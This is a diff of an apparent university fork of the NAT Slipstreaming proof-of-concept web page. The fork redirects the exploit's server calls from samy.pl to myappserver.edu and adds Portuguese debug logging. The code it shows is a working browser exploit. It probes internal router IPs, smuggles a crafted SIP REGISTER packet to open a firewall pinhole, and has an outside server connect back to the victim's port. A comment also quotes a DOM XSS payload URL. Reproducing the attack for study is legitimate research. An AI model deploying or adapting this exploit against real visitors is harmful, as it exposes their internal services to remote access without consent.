@@ -17,7 +17,7 @@
 
 <a href="https://samy.pl/slipstream/">NAT Slipstreaming</a> allows an attacker to remotely access any TCP/UDP services bound to a victim machine, bypassing the victim's NAT/firewall (arbitrary firewall pinhole control), just by the victim visiting a website. <a href="https://samy.pl/slipstream/">Full writeup here.</a><p>
 
-<a href="https://github.com/samyk/slipstream/">github.com/samyk/slipstream</a>: NAT Slipstreaming PoC code</a><p>
+<a href="https://github.com/utfpr-cesc/slipstream/">github.com/utfpr-cesc/slipstream</a>: Ilicilho/Rui's fork of original NAT Slipstreaming PoC code by Samy Kamkar</a><p>
 
 <p>
 please run:<br>
@@ -100,7 +100,7 @@ var offerOptions = {offerToReceiveAudio: 1}
 var ip_dups = {}
 var pc
 var port
-var stun = "stun:samy.pl:3478"
+var stun = "stun:myappserver.edu:3478"
 	//"iceServers": [ { "urls": [stun], "username": "samy", "credential": "samy" } ],
 var config = {
 	//"iceServers": [ { "urls": [stun] } ],
@@ -115,6 +115,7 @@ var nets = [
 	'10.0.0.1',
 	'10.0.0.138',
 	'10.0.0.2',
+	'10.0.1.*',
 	'10.0.1.1',
 	'10.1.1.1',
 	'10.1.10.1',
@@ -139,6 +140,7 @@ var nets = [
 	'192.168.10.10',
 	'192.168.10.100',
 	'192.168.10.50',
+	'192.168.100.1',
 	'192.168.100.100',
 	'192.168.123.254',
 	'192.168.168.168',
@@ -251,6 +253,7 @@ console.log("sorted", possibleIps)
 
 	/* time how long "image" takes to load/error */
 	img.src = 'http://' + ip + '/samy.jpg'
+	console.log('CHAMANDO IMAGEM', img.src);
 	;(function(img, i) {
 		// remove the element
 		setTimeout(function()
@@ -302,6 +305,7 @@ var checkButton = function()
 {
 	if ((possibleIps.length || internal || external) && maxbytes)
 	{
+		log('checkButton: ' + possibleIps.length + ' ' + internal + ' ' + external + ' ' + maxbytes);
 		if (document.getElementById('button').disabled)
 			log('\nready to traverse NAT/network/firewall, <b>press button above</b>...')
 		document.getElementById('button').disabled = false
@@ -319,6 +323,7 @@ var checkButton = function()
 
 function log(msg)
 {
+	console.log('[log]', msg);
 	document.getElementById('log').innerHTML = htmlEncodeSpecial(msg) + '<br>' + document.getElementById('log').innerHTML
 }
 
@@ -347,7 +352,7 @@ function maxpktsize()
 
 	// note 'packet_size' length is critical, must be same as other post
 	log('responding to SYN with maximum segment size TCP option to control data size')
-	post("http://samy.pl:5060/samy_pktsiz", pkt, 1)
+	post("http://myappserver.edu:5060/samy_pktsiz", pkt, 1)
 	log('sending TCP beacon to detect maximum packet size and MTU')
 }
 
@@ -355,13 +360,14 @@ function getSize()
 {
 	var scr = document.createElement('script')
 	scr.type = 'text/javascript'
-	scr.src = '//samy.pl/natpin/get_size.php?id=' + rand + '&rand=' + rnd()
+	scr.src = '//myappserver.edu/slipstream/get_size.php?id=' + rand + '&rand=' + rnd()
 	log('requesting sniffed packet sizes from server')
 	document.head.appendChild(scr)
 }
 
 function natpin()
 {
+	log('Travando o botão "open this port"...');
 	document.getElementById('port').disabled = true
 	document.getElementById('button').disabled = true 
 	document.getElementById('button').value = 'please refresh to retry/change port'
@@ -443,7 +449,7 @@ function offset(off, data, origoff)
 				lastOff = off
 
 			log("packet size changed on us, reattempt SIP REGISTER")
-			addScript('//samy.pl/natpin/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+			addScript('//myappserver.edu/slipstream/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
 			attemptPin(fullpkt)
 		}
 	}
@@ -480,7 +486,7 @@ function tryConnect()
 {
 	log('running: nc -v <?php echo getenv('REMOTE_ADDR') ?> ' + port)
 	log('\n<b>attempting to bypass your NAT/firewall</b>')
-	addScript('//samy.pl/natpin/connect.php?id=' + rand + '&port=' + port)
+	addScript('//myappserver.edu/slipstream/connect.php?id=' + rand + '&port=' + port)
 }
 
 // called from /connect.pl (along with some log()s)
@@ -549,7 +555,7 @@ function runpin()
 	ip = <?php echo $ip ?>;
 	var cid = rand.padStart(30, 'a') + 'b'
 
-	var reg = 'REGISTER sip:samy.pl;transport=TCP SIP/2.0\r\nVia: SIP/2.0/TCP {INTIP}:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP\r\nMax-Forwards: 70\r\nContact: <sip:samy@{INTIP}:' + port + ';rinstance=v40f3f83b335139c;transport=TCP>\r\nTo: <sip:samy@samy.pl;transport=TCP>\r\nFrom: <sip:samy@samy.pl;transport=TCP>;tag=U7c3d519\r\nCall-ID: ' + cid + 'bbbbbZjQ4M2M.\r\nCSeq: 1 REGISTER\r\nExpires: 70\r\nAllow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE\r\nSupported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri\r\nUser-Agent: samy natpinning v2\r\nAllow-Events: presence, kpml\r\nContent-Length: 0\r\n\r\n'
+	var reg = 'REGISTER sip:myappserver.edu;transport=TCP SIP/2.0\r\nVia: SIP/2.0/TCP {INTIP}:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP\r\nMax-Forwards: 70\r\nContact: <sip:samy@{INTIP}:' + port + ';rinstance=v40f3f83b335139c;transport=TCP>\r\nTo: <sip:samy@myappserver.edu;transport=TCP>\r\nFrom: <sip:samy@myappserver.edu;transport=TCP>;tag=U7c3d519\r\nCall-ID: ' + cid + 'bbbbbZjQ4M2M.\r\nCSeq: 1 REGISTER\r\nExpires: 70\r\nAllow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE\r\nSupported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri\r\nUser-Agent: samy natpinning v2\r\nAllow-Events: presence, kpml\r\nContent-Length: 0\r\n\r\n'
 	//reg += 'v=0\r\no=151 9655 9655 IN IP4 {INTIP}\r\ns=-\r\nc=IN IP4 {INTIP}\r\nt=0 0\r\nm=audio '+port+' RTP/AVP 8 0 2 18\r\na=rtpmap:8 PCMA/8000\r\na=rtpmap:0 PCMU/8000\r\na=rtpmap:2 G726-32/8000/1\r\na=rtpmap:18 G729/8000\r\na=ptime:20\r\na=maxptime:80\r\na=sendrecv\r\na=rtcp:50025\r\n\r\n'
 
 	// create the padding to force our packet to fall onto next packet boundary
@@ -573,7 +579,7 @@ function runpin()
 	fullpkt = s
 
 	// get our sip request from the server, calls offset() if good, otherwise noRespTimer will likely hit
-	addScript('//samy.pl/natpin/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+	addScript('//myappserver.edu/slipstream/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
 
 	// if we don't get request in a few seconds, something wrong...maybe wrong internal ip if safari
 	noRespTimer = setTimeout(noResponse, 5000)
@@ -591,7 +597,7 @@ function attemptPin(pkt)
 	// keep changing url to evade browser caching attempts
 	// THE LENGTH OF THE URL MUST BE 12 bytes total, eg /samy_n?0012
 	// to match the same size we got when testing /samy_pktsiz
-	post("http://samy.pl:5060/samy_n?"+incr, pkt, 1)
+	post("http://myappserver.edu:5060/samy_n?"+incr, pkt, 1)
 }
 
 function post(url, str, reuse)
@@ -633,8 +639,15 @@ console.log(url, str.length)
 	//setTimeout('l('+port+')', 500)
 
 	// this may never complete
-  if (window.location.protocol === 'http:')
-    gibson.submit()
+	log('Fazendo requisição para ' + url + ' ' + str + ' ' + reuse + '...');
+	if (window.location.protocol === 'http:') {
+		log('... via HTTP');
+		try {
+			gibson.submit();
+		} catch(e) {
+			console.error('Capturei erro ', e);
+		}
+	}
 }
 
 function l(port)
@@ -642,7 +655,7 @@ function l(port)
 	alert("Great! Almost done. Now, from a remote network, try running the command:\n\ntelnet <?php echo getenv('REMOTE_ADDR') ?> " + port + "\n\nNote: This proof of concept may not work on all routers. Tested successfully on Belkin N1 Vision Wireless Router.")
 }
 
-//config={"iceServers":[{"urls":["stun:samy.pl:3478"],"username":"hello","credential":"bye"}],"iceTransportPolicy":"all","iceCandidatePoolSize":"0"}
+//config={"iceServers":[{"urls":["stun:myappserver.edu:3478"],"username":"hello","credential":"bye"}],"iceTransportPolicy":"all","iceCandidatePoolSize":"0"}
 
 function gotDescription(desc)
 {
@@ -720,7 +733,7 @@ function go(type)
 
 function nlog(str)
 {
-	post('//samy.pl/natpin/nlog.php', str)
+	post('//myappserver.edu/slipstream/nlog.php', str)
 }
 function gather(sc)
 {
@@ -946,6 +959,7 @@ function getArgs(url)
 		var pair = vars[i].split('=')
 		params[pair[0]] = decodeURIComponent(pair[1])
 	}
+	log(Array.from(Object.keys(params)).map(k => `${k}: ${params[k]}`).join('; '));
 	return params
 }
 
@@ -1023,7 +1037,7 @@ if (!String.prototype.padStart) {
     };
 }
 
-// to fix DOM-based XSS issues - https://samy.pl/slipstream/server.php?localip=1.1.1.1<img src onerror%3dalert(1)>
+// to fix DOM-based XSS issues - https://myappserver.edu/slipstream/server.php?localip=1.1.1.1<img src onerror%3dalert(1)>
 function htmlEncodeSpecial(value) {
     return value.replace(/</gi,'&lt;').replace(/>/gi,'&gt;').replace(/&lt;([a-zA-Z])&gt;/gi,'\<$1\>').replace(/&lt;\/([a-zA-Z])&gt;/gi,'</$1>');
 }
